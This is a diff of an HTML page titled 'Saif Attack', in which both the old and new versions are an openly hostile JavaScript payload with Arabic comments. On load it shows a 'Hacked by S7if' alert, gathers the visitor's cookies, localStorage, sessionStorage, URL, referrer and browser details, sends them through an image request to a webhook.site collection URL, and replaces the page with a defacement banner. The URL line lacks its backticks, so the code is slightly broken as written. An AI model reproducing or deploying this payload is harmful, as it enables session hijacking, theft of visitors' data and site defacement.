@@ -1,33 +1,42 @@
-<script>
-(async () => {
-  alert("💀 Hacked by S7if 💀");
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>Saif Attack</title>
+  </head>
+  <body>
+    <script>
+      window.addEventListener("load", () => {
+        alert("💀 Hacked by S7if 💀");
 
-  // اجمع البيانات
-  const data = {
-    cookies: document.cookie,
-    localStorage: JSON.stringify(localStorage),
-    sessionStorage: JSON.stringify(sessionStorage),
-    url: location.href,
-    referrer: document.referrer,
-    userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    time: new Date().toISOString()
-  };
+        // جمع البيانات
+        const data = {
+          cookies: document.cookie,
+          localStorage: JSON.stringify(localStorage),
+          sessionStorage: JSON.stringify(sessionStorage),
+          url: location.href,
+          referrer: document.referrer,
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          time: new Date().toISOString()
+        };
 
-  // حوّل الداتا لـ query param باستخدام encodeURIComponent
-  const payload = encodeURIComponent(JSON.stringify(data));
+        // Encode payload
+        const payload = encodeURIComponent(JSON.stringify(data));
 
-  // أرسل باستخدام img src (لتفادي CORS)
-  const img = new Image();
-  img.src = https://webhook.site/323bd404-2b33-4438-93b4-81f85ccc77cb?exfil=${payload};
-  document.body.appendChild(img);
+        // إرسال الداتا باستخدام img
+        const img = new Image();
+        img.src = https://webhook.site/323bd404-2b33-4438-93b4-81f85ccc77cb?exfil=${payload};
+        document.body.appendChild(img);
 
-  // رعب بصري
-  document.body.innerHTML = `
-    <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#0f0;font-size:2em;font-family:monospace;text-align:center;flex-direction:column;">
-      <div>👾 Hacked by <b>Saif</b> 👾</div>
-      <div style="font-size: 0.6em; margin-top: 20px;">All your data belongs to us</div>
-    </div>
-  `;
-})();
-</script>
+        // تغيير شكل الصفحة
+        document.body.innerHTML = `
+          <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#0f0;font-size:2em;font-family:monospace;text-align:center;flex-direction:column;">
+            <div>👾 Hacked by <b>Saif</b> 👾</div>
+            <div style="font-size: 0.6em; margin-top: 20px;">Your session has been terminated.</div>
+          </div>
+        `;
+      });
+    </script>
+  </body>
+</html>
